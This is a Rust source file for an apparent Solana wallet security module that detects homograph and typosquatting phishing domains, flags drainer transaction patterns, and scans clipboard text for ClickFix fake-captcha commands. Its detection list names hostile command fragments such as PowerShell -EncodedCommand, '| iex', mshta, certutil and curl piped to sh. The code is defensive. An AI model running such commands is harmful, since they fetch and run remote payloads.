#[cfg(not(standalone_test))]
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq)]
#[cfg_attr(not(standalone_test), derive(Serialize, Deserialize))]
#[cfg_attr(not(standalone_test), serde(rename_all = "camelCase"))]
pub enum SecurityRiskLevel {
    Safe,
    Warning,
    CriticalBlock,
}

#[derive(Debug, Clone)]
#[cfg_attr(not(standalone_test), derive(Serialize, Deserialize))]
#[cfg_attr(not(standalone_test), serde(rename_all = "camelCase"))]
pub struct PhishingVerdict {
    pub url: String,
    pub normalized_domain: String,
    pub risk_level: SecurityRiskLevel,
    pub blocked: bool,
    pub risk_score: u8,
    pub targeted_brand: Option<String>,
    pub triggers: Vec<String>,
    pub explanation_id: String,
    pub explanation_tech: String,
}

#[derive(Debug, Clone)]
#[cfg_attr(not(standalone_test), derive(Serialize, Deserialize))]
#[cfg_attr(not(standalone_test), serde(rename_all = "camelCase"))]
pub struct SimulatedInstruction {
    pub program_id: String,
    pub instruction_type: String,
    pub authority_type: Option<String>,
    pub new_authority: Option<String>,
    pub delegate: Option<String>,
    pub destination: Option<String>,
    pub amount: Option<u64>,
    pub token_mint: Option<String>,
    pub is_unlimited_approval: Option<bool>,
}

#[derive(Debug, Clone)]
#[cfg_attr(not(standalone_test), derive(Serialize, Deserialize))]
#[cfg_attr(not(standalone_test), serde(rename_all = "camelCase"))]
pub struct SolanaTxSimulationRequest {
    pub origin_url: Option<String>,
    pub signer_wallet: String,
    pub wallet_sol_balance_lamports: u64,
    pub instructions: Vec<SimulatedInstruction>,
    pub raw_payload_preview: Option<String>,
}

#[derive(Debug, Clone)]
#[cfg_attr(not(standalone_test), derive(Serialize, Deserialize))]
#[cfg_attr(not(standalone_test), serde(rename_all = "camelCase"))]
pub struct TransactionSimResult {
    pub risk_level: SecurityRiskLevel,
    pub blocked: bool,
    pub risk_score: u8,
    pub detected_threats: Vec<String>,
    pub balance_delta_summary: Vec<String>,
    pub explanation_id: String,
    pub explanation_tech: String,
    pub recommendation: String,
}

#[derive(Debug, Clone)]
#[cfg_attr(not(standalone_test), derive(Serialize, Deserialize))]
#[cfg_attr(not(standalone_test), serde(rename_all = "camelCase"))]
pub struct ClickFixVerdict {
    pub inspected_text_preview: String,
    pub risk_level: SecurityRiskLevel,
    pub blocked: bool,
    pub risk_score: u8,
    pub matched_signatures: Vec<String>,
    pub decoded_payload_hint: Option<String>,
    pub explanation_id: String,
    pub explanation_tech: String,
}

/// Protected Solana Ecosystem Domains monitored for homograph & typosquatting attacks
pub const PROTECTED_SOLANA_DOMAINS: &[(&str, &str)] = &[
    ("jup.ag", "Jupiter Exchange"),
    ("raydium.io", "Raydium DEX"),
    ("phantom.app", "Phantom Wallet"),
    ("magiceden.io", "Magic Eden"),
    ("sanctum.so", "Sanctum Liquid Staking"),
    ("meteora.ag", "Meteora DLMM"),
    ("gmgn.ai", "GMGN.ai Degen Terminal"),
    ("pump.fun", "Pump.fun Launchpad"),
    ("solscan.io", "Solscan Explorer"),
    ("solana.com", "Solana Foundation"),
    ("solflare.com", "Solflare Wallet"),
    ("backpack.app", "Backpack Exchange & Wallet"),
    ("tensor.trade", "Tensor NFT"),
    ("orca.so", "Orca Whirlpools"),
    ("drift.trade", "Drift Protocol"),
    ("marginfi.com", "marginfi"),
    ("kamino.finance", "Kamino Finance"),
    ("helius.dev", "Helius RPC"),
];

/// Trusted On-Chain Solana Program IDs
pub const TRUSTED_SOLANA_PROGRAMS: &[(&str, &str)] = &[
    ("11111111111111111111111111111111", "System Program"),
    ("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", "SPL Token Program"),
    ("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb", "SPL Token-2022 Program"),
    ("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL", "Associated Token Account Program"),
    ("ComputeBudget111111111111111111111111111111", "Compute Budget Program"),
    ("JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4", "Jupiter Aggregator v6"),
    ("675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8", "Raydium Liquidity Pool V4"),
    ("CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK", "Raydium Concentrated Liquidity"),
    ("whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc", "Orca Whirlpools"),
    ("LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo", "Meteora DLMM"),
];

pub const VERIFIED_DEX_PROGRAMS: &[&str] = &[
    "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4",
    "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8",
    "CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK",
    "whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc",
    "LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo",
];

/// Extract host from a URL or raw domain string
pub fn extract_host(input: &str) -> String {
    let trimmed = input.trim();
    let without_scheme = if let Some(idx) = trimmed.find("://") {
        &trimmed[idx + 3..]
    } else {
        trimmed
    };
    let without_path = without_scheme
        .split(&['/', '?', '#'][..])
        .next()
        .unwrap_or(without_scheme);
    let without_userinfo = if let Some(at_idx) = without_path.rfind('@') {
        &without_path[at_idx + 1..]
    } else {
        without_path
    };
    let without_port = without_userinfo
        .split(':')
        .next()
        .unwrap_or(without_userinfo);
    without_port.trim_end_matches('.').to_lowercase()
}

/// Map Unicode confusables (Cyrillic, Greek, Latin accents, digits) to their ASCII skeleton
fn confusable_to_ascii(ch: char) -> char {
    match ch {
        // Cyrillic small & capital lookalikes
        '\u{0430}' | '\u{0410}' | 'á' | 'à' | 'ä' | 'â' | 'ã' | 'å' | 'α' => 'a',
        '\u{0432}' | '\u{0412}' | 'β' => 'b',
        '\u{0441}' | '\u{0421}' | 'ç' => 'c',
        '\u{0435}' | '\u{0415}' | 'é' | 'è' | 'ë' | 'ê' | 'ε' => 'e',
        '\u{0456}' | '\u{0406}' | 'í' | 'ì' | 'ï' | 'î' | 'ι' | '1' | '!' | '|' => 'i',
        '\u{0458}' => 'j',
        '\u{043A}' | '\u{041A}' | 'κ' => 'k',
        '\u{043C}' | '\u{041C}' => 'm',
        '\u{043D}' | '\u{041D}' | 'η' => 'h',
        '\u{043E}' | '\u{041E}' | 'ó' | 'ò' | 'ö' | 'ô' | 'õ' | 'ο' | '0' => 'o',
        '\u{0440}' | '\u{0420}' | 'ρ' => 'p',
        '\u{0455}' | '\u{0405}' | '$' => 's',
        '\u{0442}' | '\u{0422}' | 'τ' => 't',
        '\u{0443}' | '\u{0423}' | 'ú' | 'ù' | 'ü' | 'û' | 'υ' | 'ν' => 'y',
        '\u{0445}' | '\u{0425}' | 'χ' => 'x',
        _ => ch.to_ascii_lowercase(),
    }
}

fn skeletonize_domain(domain: &str) -> String {
    let mapped: String = domain.chars().map(confusable_to_ascii).collect();
    mapped.replace("rn", "m").replace("vv", "w")
}

/// Standard Levenshtein edit distance between two ASCII strings
pub fn levenshtein_distance(a: &str, b: &str) -> usize {
    let a_chars: Vec<char> = a.chars().collect();
    let b_chars: Vec<char> = b.chars().collect();
    let m = a_chars.len();
    let n = b_chars.len();

    if m == 0 {
        return n;
    }
    if n == 0 {
        return m;
    }

    let mut prev: Vec<usize> = (0..=n).collect();
    let mut curr: Vec<usize> = vec![0; n + 1];

    for i in 1..=m {
        curr[0] = i;
        for j in 1..=n {
            let cost = if a_chars[i - 1] == b_chars[j - 1] { 0 } else { 1 };
            curr[j] = (prev[j] + 1)
                .min(curr[j - 1] + 1)
                .min(prev[j - 1] + cost);
        }
        std::mem::swap(&mut prev, &mut curr);
    }
    prev[n]
}

fn extract_registrable_domain(host: &str) -> String {
    let parts: Vec<&str> = host.split('.').filter(|s| !s.is_empty()).collect();
    if parts.len() >= 2 {
        format!("{}.{}", parts[parts.len() - 2], parts[parts.len() - 1])
    } else {
        host.to_string()
    }
}

/// Real-Time Phishing & Homograph Domain Detector
pub fn check_phishing_url(url: &str) -> PhishingVerdict {
    let host = extract_host(url);
    let registrable = extract_registrable_domain(&host);
    let mut triggers: Vec<String> = Vec::new();
    let mut targeted_brand: Option<String> = None;
    let mut risk_score: u16 = 0;

    let has_non_ascii = !host.is_ascii();
    let has_punycode = host.contains("xn--");

    if has_non_ascii {
        triggers.push("IDN_UNICODE_HOMOGRAPH: Domain mengandung karakter non-ASCII (Cyrillic/Greek/Unicode lookalike)".to_string());
        risk_score += 85;
    }
    if has_punycode {
        triggers.push("PUNYCODE_IDN_PREFIX: Domain menggunakan encoding Punycode (xn--) yang sering dipakai untuk serangan homograph".to_string());
        risk_score += 80;
    }

    // Check if exact match with protected domain (and ASCII clean)
    let is_exact_protected = !has_non_ascii
        && !has_punycode
        && PROTECTED_SOLANA_DOMAINS
            .iter()
            .any(|(dom, _)| host == *dom || host.ends_with(&format!(".{}", dom)));

    // Suspicious subdomain / path / keyword lures
    let lower_url = url.to_lowercase();
    let lure_keywords = [
        ("claim-", "Subdomain lure 'claim-' terdeteksi"),
        ("airdrop-", "Subdomain lure 'airdrop-' terdeteksi"),
        ("-airdrop", "Domain lure '-airdrop' terdeteksi"),
        ("-claim", "Domain lure '-claim' terdeteksi"),
        ("-verify", "Domain lure '-verify' terdeteksi"),
        ("verify-", "Subdomain lure 'verify-' terdeteksi"),
        ("rectify-", "Phishing lure 'rectify-' wallet recovery"),
        ("wallet-validate", "Phishing lure 'wallet-validate'"),
        ("seed-restore", "Phishing lure 'seed-restore'"),
        ("drainer", "Signature eksplisit 'drainer' pada URL"),
    ];

    for (kw, desc) in lure_keywords.iter() {
        if host.contains(kw) || lower_url.contains(kw) {
            triggers.push(format!("PHISHING_LURE_PATTERN: {}", desc));
            risk_score += 55;
        }
    }

    // Suspicious TLDs abused in phishing
    let high_risk_tlds = [".zip", ".mov", ".tk", ".ml", ".cf", ".gq", ".top"];
    for tld in high_risk_tlds.iter() {
        if host.ends_with(tld) {
            triggers.push(format!(
                "SUSPICIOUS_TLD: TLD berisiko tinggi '{}' sering disalahgunakan untuk menipu user",
                tld
            ));
            risk_score += 50;
        }
    }

    // Check homograph skeleton & Levenshtein typosquatting against protected Solana domains
    if !is_exact_protected {
        let host_skeleton = skeletonize_domain(&registrable);
        let host_sld = registrable.split('.').next().unwrap_or(&registrable);
        let host_sld_skeleton = skeletonize_domain(host_sld);

        for (protected_dom, brand_name) in PROTECTED_SOLANA_DOMAINS.iter() {
            let protected_sld = protected_dom.split('.').next().unwrap_or(protected_dom);
            let protected_skeleton = skeletonize_domain(protected_dom);
            let protected_sld_skeleton = skeletonize_domain(protected_sld);

            // 1. Skeleton match (e.g. Cyrillic 'а' in rаydium.io or rnagiceden.io or phant0m.app)
            if (host_skeleton == protected_skeleton || host_sld_skeleton == protected_sld_skeleton)
                && registrable != *protected_dom
            {
                targeted_brand = Some((*brand_name).to_string());
                triggers.push(format!(
                    "HOMOGRAPH_IMPERSONATION: Domain '{}' meniru visual '{}' ({})",
                    host, protected_dom, brand_name
                ));
                risk_score += 95;
                break;
            }

            // 2. Levenshtein distance <= 2 on full registrable domain or SLD (for SLDs >= 5 chars)
            let dist_full = levenshtein_distance(&registrable, protected_dom);
            let dist_sld = levenshtein_distance(host_sld, protected_sld);

            if (1..=2).contains(&dist_full)
                || (protected_sld.len() >= 5 && (1..=2).contains(&dist_sld))
            {
                targeted_brand = Some((*brand_name).to_string());
                triggers.push(format!(
                    "TYPOSQUATTING_DETECTED: Jarak Levenshtein {} terhadap domain resmi '{}' ({})",
                    dist_full.min(dist_sld),
                    protected_dom,
                    brand_name
                ));
                risk_score += 90;
                break;
            }

            // 3. Brand name embedded with hyphen or fake TLD (e.g. jup-ag.com, phantom-wallet.io, raydium.com)
            if host.contains(protected_sld) && registrable != *protected_dom {
                targeted_brand = Some((*brand_name).to_string());
                triggers.push(format!(
                    "BRAND_SPOOFING: Nama brand '{}' disematkan pada domain tidak resmi '{}'",
                    brand_name, host
                ));
                risk_score += 85;
                break;
            }
        }
    }

    let final_score = risk_score.min(100) as u8;
    let risk_level = if final_score >= 70 {
        SecurityRiskLevel::CriticalBlock
    } else if final_score >= 35 {
        SecurityRiskLevel::Warning
    } else {
        SecurityRiskLevel::Safe
    };
    let blocked = risk_level == SecurityRiskLevel::CriticalBlock;

    let (explanation_id, explanation_tech) = match risk_level {
        SecurityRiskLevel::CriticalBlock => {
            let brand_msg = targeted_brand
                .as_deref()
                .map(|b| format!(" yang meniru {}", b))
                .unwrap_or_default();
            (
                format!(
                    "DIBLOKIR OTOMATIS: Domain '{}' terdeteksi sebagai situs phishing/drainer berbahaya{}. Koneksi dompet vault.solos telah diputus untuk melindungi aset Anda.",
                    host, brand_msg
                ),
                format!(
                    "Anti-Drainer Shield triggered CRITICAL_BLOCK (score {}/100) on host '{}'. Indicators: [{}]",
                    final_score,
                    host,
                    triggers.join(" | ")
                ),
            )
        }
        SecurityRiskLevel::Warning => (
            format!(
                "PERINGATAN KEAMANAN: Domain '{}' memiliki indikator mencurigakan. Jangan menandatangani transaksi buta atau memasukkan seed phrase.",
                host
            ),
            format!(
                "Heuristic warning (score {}/100) on host '{}'. Indicators: [{}]",
                final_score,
                host,
                triggers.join(" | ")
            ),
        ),
        SecurityRiskLevel::Safe => (
            format!(
                "AMAN: Domain '{}' terverifikasi bersih dan tidak memicu heuristik phishing atau homograph.",
                host
            ),
            format!(
                "Domain '{}' passed IDN/Punycode, Levenshtein typosquatting, and lure heuristics (score 0/100).",
                host
            ),
        ),
    };

    PhishingVerdict {
        url: url.to_string(),
        normalized_domain: host,
        risk_level,
        blocked,
        risk_score: final_score,
        targeted_brand,
        triggers,
        explanation_id,
        explanation_tech,
    }
}

/// Pre-Sign Solana Transaction Simulator & Drainer Blocker
pub fn simulate_and_verify_transaction(req: &SolanaTxSimulationRequest) -> TransactionSimResult {
    let mut detected_threats: Vec<String> = Vec::new();
    let mut balance_delta_summary: Vec<String> = Vec::new();
    let mut risk_score: u16 = 0;

    // 0. Check origin URL if provided
    if let Some(ref origin) = req.origin_url {
        if !origin.trim().is_empty() {
            let url_verdict = check_phishing_url(origin);
            if url_verdict.risk_level == SecurityRiskLevel::CriticalBlock {
                detected_threats.push(format!(
                    "PHISHING_ORIGIN: Transaksi berasal dari domain berbahaya '{}'",
                    url_verdict.normalized_domain
                ));
                risk_score += 85;
            }
        }
    }

    let mut has_advance_nonce = false;
    let mut outbound_transfer_count = 0usize;
    let mut total_sol_out_lamports: u64 = 0;
    let mut has_verified_dex = false;
    let mut unknown_programs: Vec<String> = Vec::new();

    for (idx, ix) in req.instructions.iter().enumerate() {
        let prog = ix.program_id.trim();
        let ix_type = ix.instruction_type.trim();
        let ix_type_lower = ix_type.to_lowercase();

        let is_trusted_prog = TRUSTED_SOLANA_PROGRAMS.iter().any(|(id, _)| *id == prog);
        if VERIFIED_DEX_PROGRAMS.contains(&prog) {
            has_verified_dex = true;
        }
        if !is_trusted_prog && !prog.is_empty() {
            unknown_programs.push(prog.to_string());
        }

        // 1. Detect SetAuthority / Assign Ownership Hijack
        if ix_type_lower == "setauthority" || ix_type_lower == "assign" {
            let auth_kind = ix
                .authority_type
                .as_deref()
                .unwrap_or("AccountOwner");
            let new_auth = ix
                .new_authority
                .as_deref()
                .unwrap_or("UNKNOWN_ATTACKER");

            if new_auth != req.signer_wallet {
                detected_threats.push(format!(
                    "SETAUTHORITY_OWNERSHIP_HIJACK (Ix #{}): Percobaan mengubah '{}' akun ke alamat eksternal '{}' — teknik utama wallet drainer untuk mencuri seluruh saldo token secara permanen!",
                    idx + 1,
                    auth_kind,
                    new_auth
                ));
                balance_delta_summary.push(format!(
                    "-100% KEPEMILIKAN AKUN ({} -> {})",
                    auth_kind, new_auth
                ));
                risk_score += 100;
            }
        }

        // 2. Detect Unlimited or High-Value SPL Token Approve / ApproveChecked Delegate
        if ix_type_lower == "approve" || ix_type_lower == "approvechecked" {
            let delegate = ix.delegate.as_deref().unwrap_or("UNKNOWN_DELEGATE");
            let amount = ix.amount.unwrap_or(u64::MAX);
            let is_unlimited = ix.is_unlimited_approval.unwrap_or(false)
                || amount >= u64::MAX / 2
                || amount >= 1_000_000_000_000_000;

            let delegate_trusted = TRUSTED_SOLANA_PROGRAMS.iter().any(|(id, _)| *id == delegate);
            if is_unlimited || !delegate_trusted {
                detected_threats.push(format!(
                    "MALICIOUS_TOKEN_APPROVE (Ix #{}): Instruksi '{}' memberikan akses penarikan token (amount: {}) kepada delegate tidak terpercaya '{}'",
                    idx + 1,
                    ix_type,
                    if is_unlimited { "UNLIMITED / MAX_U64".to_string() } else { amount.to_string() },
                    delegate
                ));
                balance_delta_summary.push(format!(
                    "DELEGATE APPROVAL: Izin tarik token ke {}",
                    delegate
                ));
                risk_score += 95;
            }
        }

        // 3. Detect Durable Nonce Phishing (`AdvanceNonceAccount`)
        if ix_type_lower == "advancenonceaccount" || ix_type_lower.contains("advancenonce") {
            has_advance_nonce = true;
        }

        // 4. Track Outbound Transfers & CloseAccount sweeps
        if ix_type_lower == "transfer"
            || ix_type_lower == "transferchecked"
            || ix_type_lower == "closeaccount"
        {
            let dest = ix.destination.as_deref().unwrap_or("external");
            if dest != req.signer_wallet {
                outbound_transfer_count += 1;
                let amt = ix.amount.unwrap_or(0);
                if prog == "11111111111111111111111111111111" || ix.token_mint.is_none() {
                    total_sol_out_lamports = total_sol_out_lamports.saturating_add(amt);
                    let sol_val = (amt as f64) / 1_000_000_000.0;
                    balance_delta_summary.push(format!("-{:.4} SOL -> {}", sol_val, dest));
                } else {
                    let mint_label = ix.token_mint.as_deref().unwrap_or("SPL-Token");
                    balance_delta_summary.push(format!("-{} {} -> {}", amt, mint_label, dest));
                }
            }
        }
    }

    // Evaluate Durable Nonce attack combination
    if has_advance_nonce
        && (outbound_transfer_count > 0 || !unknown_programs.is_empty() || risk_score > 0)
    {
        detected_threats.push(
            "DURABLE_NONCE_DRainer: Transaksi menggunakan 'AdvanceNonceAccount' bersama transfer aset — tanda tangan tidak pernah kedaluwarsa dan dapat dieksekusi penyerang kapan saja!".to_string(),
        );
        risk_score += 95;
    }

    // Evaluate Hidden Multi-Asset Sweep / Balance Drainer (>80% SOL balance or >= 3 asset transfers without verified DEX)
    let drains_over_80_pct = req.wallet_sol_balance_lamports > 0
        && (total_sol_out_lamports as u128) * 100
            >= (req.wallet_sol_balance_lamports as u128) * 80;

    if !has_verified_dex && outbound_transfer_count >= 2 && (drains_over_80_pct || outbound_transfer_count >= 3 || !unknown_programs.is_empty()) {
        detected_threats.push(format!(
            "MULTI_ASSET_SWEEP_DRAINER: Terdeteksi {} instruksi pengurasan aset beruntun dalam satu transaksi tanpa kontrak DEX terverifikasi",
            outbound_transfer_count
        ));
        risk_score += 90;
    } else if !has_verified_dex && drains_over_80_pct && !unknown_programs.is_empty() {
        detected_threats.push(
            "HIGH_BALANCE_DRAIN_UNKNOWN_PROGRAM: Pengurasan >80% saldo SOL yang digabungkan dengan program tidak dikenal".to_string(),
        );
        risk_score += 85;
    } else if !unknown_programs.is_empty() && risk_score == 0 {
        detected_threats.push(format!(
            "UNVERIFIED_PROGRAM_ID: Transaksi memanggil program di luar daftar putih ({})",
            unknown_programs.join(", ")
        ));
        risk_score += 40;
    }

    // Also inspect raw_payload_preview if provided
    if let Some(ref raw) = req.raw_payload_preview {
        let lower_raw = raw.to_lowercase();
        if lower_raw.contains("setauthority") && !detected_threats.iter().any(|t| t.contains("SETAUTHORITY")) {
            detected_threats.push("RAW_PAYLOAD_SETAUTHORITY: Instruksi SetAuthority terdeteksi di dalam raw payload".to_string());
            risk_score += 90;
        }
        if lower_raw.contains("advancenonceaccount") && !has_advance_nonce {
            detected_threats.push("RAW_PAYLOAD_DURABLE_NONCE: AdvanceNonceAccount terdeteksi di dalam raw payload".to_string());
            risk_score += 85;
        }
    }

    let final_score = risk_score.min(100) as u8;
    let risk_level = if final_score >= 70 {
        SecurityRiskLevel::CriticalBlock
    } else if final_score >= 35 {
        SecurityRiskLevel::Warning
    } else {
        SecurityRiskLevel::Safe
    };
    let blocked = risk_level == SecurityRiskLevel::CriticalBlock;

    if balance_delta_summary.is_empty() {
        if has_verified_dex {
            balance_delta_summary.push("Swap terverifikasi melalui protokol DEX resmi".to_string());
        } else {
            balance_delta_summary.push("Tidak ada mutasi kepemilikan akun berbahaya".to_string());
        }
    }

    let (explanation_id, explanation_tech, recommendation) = match risk_level {
        SecurityRiskLevel::CriticalBlock => (
            format!(
                "TRANSAKSI DIBLOKIR: Pre-Sign Simulator mendeteksi pola Wallet Drainer kritis ({} ancaman). Tanda tangan kunci ML-KEM-1024 dibatalkan demi keamanan aset Anda.",
                detected_threats.len()
            ),
            format!(
                "Pre-sign simulation aborted transaction (score {}/100). Threats: [{}]",
                final_score,
                detected_threats.join(" || ")
            ),
            "JANGAN TANDA TANGANI. Tutup dApp segera dan cabut koneksi dompet.".to_string(),
        ),
        SecurityRiskLevel::Warning => (
            "PERINGATAN TRANSAKSI: Transaksi melibatkan program yang belum terverifikasi. Periksa kembali mutasi saldo sebelum menyetujui.".to_string(),
            format!(
                "Pre-sign simulation raised warning (score {}/100). Details: [{}]",
                final_score,
                detected_threats.join(" || ")
            ),
            "Gunakan Burner Room jika ingin mencoba kontrak eksperimental.".to_string(),
        ),
        SecurityRiskLevel::Safe => (
            "SIMULASI AMAN: Seluruh instruksi transaksi telah diverifikasi. Tidak ditemukan SetAuthority hijack, unlimited approve, ataupun durable nonce drainer.".to_string(),
            "Pre-sign simulation passed all instruction-level security invariants (score 0/100).".to_string(),
            "Aman untuk ditandatangani melalui enclave vault.solos.".to_string(),
        ),
    };

    TransactionSimResult {
        risk_level,
        blocked,
        risk_score: final_score,
        detected_threats,
        balance_delta_summary,
        explanation_id,
        explanation_tech,
        recommendation,
    }
}

/// Minimal Base64 decoder (handles both standard UTF-8 and UTF-16LE PowerShell payloads)
fn try_decode_base64_token(token: &str) -> Option<String> {
    let clean = token.trim().trim_matches(&['\'', '"'][..]);
    if clean.len() < 16 || !clean.len().is_multiple_of(4) {
        return None;
    }
    if !clean
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
    {
        return None;
    }

    fn b64_val(c: u8) -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    }

    let bytes = clean.as_bytes();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    let mut i = 0;
    while i < bytes.len() {
        let a = b64_val(bytes[i])?;
        let b = b64_val(bytes[i + 1])?;
        out.push((a << 2) | (b >> 4));
        if bytes[i + 2] != b'=' {
            let c = b64_val(bytes[i + 2])?;
            out.push((b << 4) | (c >> 2));
            if bytes[i + 3] != b'=' {
                let d = b64_val(bytes[i + 3])?;
                out.push((c << 6) | d);
            }
        }
        i += 4;
    }

    // Check if UTF-16LE (every odd byte is 0x00, typical for PowerShell -EncodedCommand)
    if out.len() >= 4 && out.len() % 2 == 0 && out.iter().skip(1).step_by(2).filter(|&&b| b == 0).count() > out.len() / 3 {
        let utf16: Vec<u16> = out
            .as_chunks::<2>()
            .0
            .iter()
            .map(|ch| u16::from_le_bytes(*ch))
            .collect();
        if let Ok(s) = String::from_utf16(&utf16) {
            return Some(s);
        }
    }

    String::from_utf8(out).ok()
}

/// ClickFix Command-Injection Guard
/// Detects fake-captcha clipboard poisoning attacks (PowerShell, mshta, curl|sh, iex, irm, etc.)
pub fn inspect_clipboard_clickfix(content: &str) -> ClickFixVerdict {
    let trimmed = content.trim();
    let lower = trimmed.to_lowercase();
    let mut matched_signatures: Vec<String> = Vec::new();
    let mut decoded_payload_hint: Option<String> = None;
    let mut risk_score: u16 = 0;

    let signatures: &[(&str, &str, u16)] = &[
        ("powershell", "Eksekusi shell PowerShell (vektor utama ClickFix)", 75),
        ("pwsh", "Eksekusi PowerShell Core (pwsh)", 75),
        ("-encodedcommand", "Obfuskasi payload PowerShell -EncodedCommand", 90),
        (" -enc ", "Obfuskasi flag PowerShell -enc", 85),
        (" -e ", "Flag eksekusi payload terenkode (-e)", 45),
        ("-windowstyle hidden", "Menyembunyikan jendela terminal (-WindowStyle Hidden)", 85),
        ("-w hidden", "Menyembunyikan jendela terminal (-w hidden)", 85),
        ("invoke-expression", "Eksekusi kode dinamis berbahaya (Invoke-Expression)", 90),
        ("iex(", "Eksekusi script jarak jauh via alias iex()", 90),
        ("iex ", "Eksekusi script jarak jauh via alias iex", 85),
        ("| iex", "Pipa eksekusi langsung ke Invoke-Expression (| iex)", 95),
        ("invoke-restmethod", "Download payload jarak jauh (Invoke-RestMethod)", 75),
        ("irm ", "Download payload jarak jauh via alias irm", 80),
        ("invoke-webrequest", "Download payload jarak jauh (Invoke-WebRequest)", 70),
        ("downloadstring(", "Net.WebClient DownloadString in-memory execution", 90),
        ("mshta", "Eksekusi LOLBin Windows mshta.exe untuk memuat trojan/infostealer", 95),
        ("rundll32", "Eksekusi LOLBin Windows rundll32.exe", 85),
        ("regsvr32", "Eksekusi LOLBin Windows regsvr32.exe", 85),
        ("certutil", "Penyalahgunaan certutil untuk mengunduh/dekode malware", 85),
        ("bitsadmin", "Penyalahgunaan bitsadmin untuk mengunduh malware", 85),
        ("cmd.exe /c", "Eksekusi perintah tersembunyi melalui cmd.exe /c", 80),
        ("cmd /c", "Eksekusi perintah melalui cmd /c", 75),
        ("| sh", "Remote shell pipe execution (| sh)", 90),
        ("| bash", "Remote bash pipe execution (| bash)", 90),
        ("| zsh", "Remote zsh pipe execution (| zsh)", 90),
        ("curl ", "Download command line curl", 35),
        ("wget ", "Download command line wget", 35),
        ("osascript -e", "Eksekusi AppleScript / macOS infostealer payload", 90),
        ("i am not a robot", "Komentar jebakan sosial 'I am not a robot' (ClickFix Fake Captcha)", 80),
        ("verification id", "Komentar jebakan sosial 'Verification ID' (ClickFix Fake Captcha)", 75),
        ("cloudflare", "Impersonasi verifikasi Cloudflare pada clipboard command", 60),
    ];

    for (pattern, description, weight) in signatures.iter() {
        if lower.contains(pattern) {
            matched_signatures.push(format!("{}: {}", pattern.trim(), description));
            risk_score += *weight;
        }
    }

    // Attempt to decode any Base64 words inside the clipboard text
    for token in trimmed.split_whitespace() {
        if let Some(decoded) = try_decode_base64_token(token) {
            let dec_lower = decoded.to_lowercase();
            if dec_lower.contains("http")
                || dec_lower.contains("iex")
                || dec_lower.contains("invoke")
                || dec_lower.contains("cmd")
                || dec_lower.contains("powershell")
                || dec_lower.contains("sh")
            {
                matched_signatures.push(
                    "BASE64_OBFUSCATED_STAGE2: Payload Base64 tersembunyi berhasil didekode dan berisi instruksi eksekusi jarak jauh".to_string(),
                );
                risk_score += 95;
            }
            decoded_payload_hint = Some(decoded);
            break;
        }
    }

    let final_score = risk_score.min(100) as u8;
    let risk_level = if final_score >= 70 {
        SecurityRiskLevel::CriticalBlock
    } else if final_score >= 35 {
        SecurityRiskLevel::Warning
    } else {
        SecurityRiskLevel::Safe
    };
    let blocked = risk_level == SecurityRiskLevel::CriticalBlock;

    let preview = if trimmed.chars().count() > 96 {
        let p: String = trimmed.chars().take(96).collect();
        format!("{}...", p)
    } else {
        trimmed.to_string()
    };

    let (explanation_id, explanation_tech) = match risk_level {
        SecurityRiskLevel::CriticalBlock => (
            "SERANGAN CLICKFIX DIBLOKIR: Konten clipboard berisi perintah injeksi terminal berbahaya (jebakan Fake Captcha). Clipboard telah dikarantina agar tidak dapat ditempel ke terminal atau Run dialog.".to_string(),
            format!(
                "ClickFix Command-Injection Guard triggered CRITICAL_BLOCK (score {}/100). Matched signatures: [{}]",
                final_score,
                matched_signatures.join(" | ")
            ),
        ),
        SecurityRiskLevel::Warning => (
            "PERINGATAN CLIPBOARD: Konten berisi sintaks perintah shell. Pastikan Anda tidak menyalin ini dari halaman verifikasi Captcha palsu.".to_string(),
            format!(
                "Clipboard heuristic warning (score {}/100). Matched: [{}]",
                final_score,
                matched_signatures.join(" | ")
            ),
        ),
        SecurityRiskLevel::Safe => (
            "AMAN: Konten clipboard bersih dari injeksi perintah ClickFix atau skrip eksekusi jarak jauh.".to_string(),
            "Clipboard payload passed ClickFix command-injection inspection (score 0/100).".to_string(),
        ),
    };

    ClickFixVerdict {
        inspected_text_preview: preview,
        risk_level,
        blocked,
        risk_score: final_score,
        matched_signatures,
        decoded_payload_hint,
        explanation_id,
        explanation_tech,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phishing_detector_blocks_homograph_and_typosquatting() {
        // Legitimate domains pass
        let safe_jup = check_phishing_url("https://jup.ag/swap/SOL-USDC");
        assert_eq!(safe_jup.risk_level, SecurityRiskLevel::Safe);
        assert!(!safe_jup.blocked);

        let safe_raydium = check_phishing_url("https://raydium.io/liquidity-pools/");
        assert_eq!(safe_raydium.risk_level, SecurityRiskLevel::Safe);

        // Homograph attack using Cyrillic 'а' (\u{0430}) in raydium.io
        let homograph = check_phishing_url("https://r\u{0430}ydium.io/swap");
        assert_eq!(homograph.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(homograph.blocked);
        assert_eq!(homograph.targeted_brand.as_deref(), Some("Raydium DEX"));

        // Punycode IDN attack
        let punycode = check_phishing_url("https://xn--jup-7la.ag");
        assert_eq!(punycode.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(punycode.blocked);

        // Typosquatting against phantom.app and magiceden.io
